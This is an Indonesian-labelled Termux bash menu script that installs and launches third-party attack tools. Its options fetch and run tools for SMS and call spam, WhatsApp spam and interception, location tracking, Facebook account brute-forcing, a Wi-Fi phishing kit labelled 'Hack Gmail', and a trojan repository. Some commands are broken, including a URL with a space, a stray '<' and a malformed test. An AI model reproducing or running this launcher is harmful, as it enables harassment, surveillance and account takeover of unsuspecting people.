
clear
figlet KODE GITHUB | lolcat
echo "===============================================================================================

#Coded : A SETENGAH 12
#Team : CYBER AHS TEAM INDO
#Contact : zainicahganteng246@gmail.com
#Github :https://github.com/Ahstermux

===============================================================================================" | lolcat
echo " PILIH NOMOR UNTUK MENDAPAT INFO" |lolcat
echo " 01. Spam sms" | lolcat
echo " 02. Spam telepon" | lolcat
echo " 03. Hack lokasi" | lolcat
echo " 04. Spam chat wa" | lolcat
echo " 05. Hack fb" | lolcat
echo " 06. Cara sadap wa" | lolcat
echo " 07. Hack Gmail" | lolcat
echo " 08. Virus Trojan" | lolcat
echo " 09. Munculkan tools tambahan untuk mempermudah" | lolcat
echo " Ketik Nomor  : " | lolcat
read nomor

if [ $nomor = 1 ] || [ $nomor = 01 ]
then
clear
echo " Install Spam sms.. " | lolcat
sleep 1
pkg install php -y
git clone https://github.com/alfianokt/caping-spam
cd caping-spam
php run.php
fi

if [ $nomor = 2 ] || [ $nomor = 02 ]
then
clear
echo " Install Spam telepon.. " | lolcat
pkg install php -y
git clone https://github.com/ClayHackerTeam/311
cd 311
php SpamCall.php
fi

if [ $nomor = 3 ] || [ $nomor = 03 ]
then 
clear
echo " Install Hack lokasi.. " | lolcat
apt-get install git curl openssh python python2 tsu -y
git clone https://github.com/thelinuxchoice/locator
cd locator
tsu
bash locator.sh
fi

if [ $nomor = 4 ] || [ $nomor = 04 ]
then
clear
echo " Install Spam chat wa" | lolcat 
pkg install python2 -y
pkg install php -y
pkg install git -y
git clone https://github.com/siputra12/prank.git
cd prank
php wa.php
fi

if [ $nomor = 5 ] || [ $nomor = 05 ]
then
clear
echo " Install Hack fb.. " | lolcat
apt update && apt upgrade
apt install python -y
apt install python2 -y
apt install ruby -y
apt install git -y
apt install wget -y
apt install curl -y 
pip2 install mechanize
pip2 install requests
git clone https://github.com/hnov7/mbf
cd mbf
python2 mbf.py
fi

if [ $nomor = 6 ] || [ $nomor = 06 ]
then
clear
echo " Install Cara sadap wa.. " | lolcat
pkg install git
pkg install curl -y
git clone https:// github.com/AndriGanz/whatshack
cd whatshack
ls
sh whatshack.sh
fi

if [ $nomor = 7 ] || [ $nomor = 07 ]
then
clear
echo " Install Hack Gmail.. " | lolcat
apt-get update && apt-get upgrade
apt-get install git -y
apt-get install python python-pip python-setuptools -y
pip install scapy
git clone https://github.com/wifiphisher/wifiphisher.git
cd wifiphisher<
python setup.py install
cd wifiphisher
python wifiphisher
fi

if [ $nomor = 8 ] || [ $nomor = 08 ]
then 
clear
echo " Virus Trojan.. " | lolcat
pkg install git
pip2 install mechanize
pip2 install requests
git clone https://github.com/R133F/Trojans
cd trojans
fi

if [ $nomor = 9 ] || [ $ nomor 09 ]
then
clear
echo " Install Munculkan tools tambahan untuk mempermudah.. " | lolcat
pkg install python -y
pkg install git
git clone https://github.com/kumpulanremaja/termuxtbb
cd termuxtbb
python kumpulanremaja.py
fi
